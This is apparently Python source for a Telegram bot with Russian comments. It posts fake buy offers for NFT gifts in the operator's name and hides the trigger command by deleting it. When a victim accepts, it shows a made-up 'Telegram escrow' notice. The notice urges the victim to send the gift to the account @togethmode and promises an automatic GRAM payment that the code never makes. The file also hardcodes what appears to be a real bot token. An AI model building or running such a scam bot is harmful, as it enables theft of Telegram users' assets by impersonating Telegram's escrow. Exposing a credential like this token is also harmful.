import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram.constants import ParseMode

TOKEN = '8850969557:AAF7ISM1vYIyqji6MGNMOfvImFWXG3S5pic'

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

async def give_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Получаем сообщение (бизнес или обычное)
    message = update.message or update.business_message
    if not message:
        return

    # ВАЖНО: business_connection_id — ключ к отправке от вашего имени
    business_connection_id = getattr(message, "business_connection_id", None)
    chat_id = update.effective_chat.id

    # 1. Удаляем сообщение через 1 секунду
    await asyncio.sleep(1)
    try:
        if business_connection_id:
            await context.bot.delete_business_messages(
                business_connection_id=business_connection_id,
                message_ids=[message.message_id]
            )
        else:
            await message.delete()
    except Exception as e:
        logging.error(f"Ошибка удаления: {e}")

    # 2. Ждем еще 4 секунды (итого 5)
    await asyncio.sleep(4)

    # Парсим команду
    text = message.text
    parts = text.split()
    
    if len(parts) < 4:
        return

    link = parts[1]
    amount = parts[2]
    gift_name = link.split('/')[-1]
    user_name = update.effective_user.first_name or "User"

    emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'
    
    offer_text = (
        f"User <b>{user_name}</b> offers you <b>{amount}</b> {emoji_gram} <b>GRAM</b> "
        f"for the gift <b><a href=\"{link}\">{gift_name}</a></b>.\n\n"
        f"The offer is valid for 6 h. 0 min.."
    )

    keyboard = [
        [
            InlineKeyboardButton("5774022692642492953 Accept", callback_data="accept_offer"),
            InlineKeyboardButton("5774077015388852135 Decline", callback_data="decline_offer")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # 3. Отправляем сообщение ОТ ВАШЕГО ИМЕНИ через business_connection_id
    try:
        if business_connection_id:
            # Именно так отправляются сообщения в бизнес-чатах
            await context.bot.send_message(
                chat_id=chat_id,
                text=offer_text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup,
                business_connection_id=business_connection_id
            )
            logging.info(f"Сообщение отправлено в чат {chat_id} через business_connection_id")
        else:
            # Фолбэк для обычного режима
            await context.bot.send_message(
                chat_id=chat_id,
                text=offer_text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
    except Exception as e:
        logging.error(f"Ошибка отправки сообщения: {e}")


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return

    data = query.data
    message = query.message

    # Определяем business_connection_id из callback-сообщения
    business_connection_id = getattr(message, "business_connection_id", None)

    # --- DECLINE ---
    if data == "decline_offer":
        await query.answer()
        await asyncio.sleep(1)
        
        emoji_decline = '<tg-emoji emoji-id="5774077015388852135">🚫</tg-emoji>'
        
        try:
            if business_connection_id:
                await context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=message.message_id,
                    text=f"{emoji_decline} Offer has been declined.",
                    parse_mode=ParseMode.HTML,
                    business_connection_id=business_connection_id
                )
            else:
                await query.edit_message_text(
                    text=f"{emoji_decline} Offer has been declined.",
                    parse_mode=ParseMode.HTML
                )
        except Exception as e:
            logging.error(f"Ошибка редактирования (Decline): {e}")

    # --- ACCEPT ---
    elif data == "accept_offer":
        
        # 1. Всплывающее окно
        popup_text = (
            "NFT Deal\n"
            "@togethmode\n\n"
            "Attention!\n\n"
            "Follow the instructions to avoid losing the gift and receive payment.\n\n"
            "Click «OK» if you have read this message."
        )
        await query.answer(text=popup_text, show_alert=True)

        # 2. Ждем 1 секунду и меняем текст
        await asyncio.sleep(1)
        
        gift_name = "ResistanceDog-703"
        amount = "2000"
        emoji_gram = '<tg-emoji emoji-id="5264766603584641330">💎</tg-emoji>'

        deal_text = (
            f"<b>NFT Deal</b>\n\n"
            f"<b>Order #TG-AC3UY0FB</b>\n\n"
            f"The buyer has reserved <b>{amount}</b> {emoji_gram} <b>GRAM</b> through the Telegram escrow system. "
            f"The funds are held in a special escrow account and will be automatically credited to your GRAM in Telegram balance right after the gift is transferred.\n\n"
            f"<b>Instructions to complete the deal:</b>\n\n"
            f"1. Send to: @togethmode\n"
            f"2. Click «Send Gift» and select {gift_name}\n"
            f"3. Confirm the gift transfer.\n\n"
            f"Telegram will record the transaction and instantly credit <b>{amount}</b> {emoji_gram} <b>GRAM</b> to your balance. "
            f"The reservation is valid for 24 hours."
        )

        keyboard = [
            [InlineKeyboardButton("Send gift", url="tg://send_gift?to=togethmode")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            if business_connection_id:
                await context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=message.message_id,
                    text=deal_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                    business_connection_id=business_connection_id
                )
            else:
                await query.edit_message_text(
                    text=deal_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup
                )
        except Exception as e:
            logging.error(f"Ошибка редактирования (Accept): {e}")


if __name__ == '__main__':
    application = ApplicationBuilder().token(TOKEN).build()

    give_handler = MessageHandler(
        filters.Regex(r'^\.give\s+t\.me/nft/\S+\s+\d+\s+gram$'), 
        give_command
    )
    application.add_handler(give_handler)
    application.add_handler(CallbackQueryHandler(button_callback))

    print("Бот запущен...")
    application.run_polling()
